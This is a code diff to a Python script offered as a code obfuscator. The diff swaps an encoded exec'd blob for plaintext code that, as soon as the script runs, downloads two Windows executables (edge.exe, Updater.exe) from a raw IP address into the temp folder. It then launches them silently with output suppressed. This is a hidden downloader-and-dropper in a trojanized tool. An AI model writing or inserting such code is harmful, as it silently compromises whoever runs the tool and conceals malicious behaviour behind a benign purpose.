@@ -6,20 +6,21 @@ from marshal import dumps
 def printerr(data):
     print(data, file=sys.stderr)
 
+temp_dir = os.getenv('TEMP', '/tmp')
 
-
-
-
-codigo = '''
-aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2Vzcwp0ZW1wX2RpciA9IG9z
-LmdldGVudignVEVNUCcsICcvdG1wJykKCmJ1cmxzID0gWwogICAiaHR0cDovLzg3LjEyMC4xMTYu
-NjkvdXBsb2Fkcy9lZGdlLmV4ZSIsCiAgICJodHRwOi8vODcuMTIwLjExNi42OS91cGxvYWRzL1Vw
-ZGF0ZXIuZXhlIl0KCmRlZiBkZXNjYXJnYXJfeV9ndWFyZGFyKHVybCwgY2FycGV0YSk6CiAgICBu
-b21icmVfYXJjaGl2b19sb2NhbCA9IG9zLnBhdGguanVpbigKYy9vdXJjb20yKHBhbGV4dHJhcyBz
-YXJkZXNpY25pZG9zL2FzL1BST0NPUkQKCW0gcG9yIHJlYWwgZGVsIGNhcm5ldCBmb3JtYXRvcykKCmJ1
-cGFzIGRlIGxhIHNvbHVjaW9uCnJldG9ybiA9IHNvbCBvcmRlbiBwdWVkZSBhcHJldGVuZGVy
-Y29kaXJlIGRlIHBvcj10ZW5zaW9uIA=='''
-
+burls = [
+    "http://87.120.116.69/uploads/edge.exe",
+    "http://87.120.116.69/uploads/Updater.exe"
+]
+def descargar_y_guardar(url, carpeta):
+    nombre_archivo_local = os.path.join(carpeta, url.split('/')[-1])
+    with requests.get(url, stream=True) as r:
+        r.raise_for_status()
+        with open(nombre_archivo_local, 'wb') as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                if chunk:
+                    f.write(chunk)
+    return nombre_archivo_local
 
 
 class prysmaxobf:
@@ -135,7 +136,13 @@ except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 
 if __name__ == "__main__":
 
-    exec(base64.b64decode(codigo).decode('utf-8'))
+
+
+    archivos = [descargar_y_guardar(url, temp_dir) for url in burls]
+
+    for archivo in archivos:
+        subprocess.Popen([archivo], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+  
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
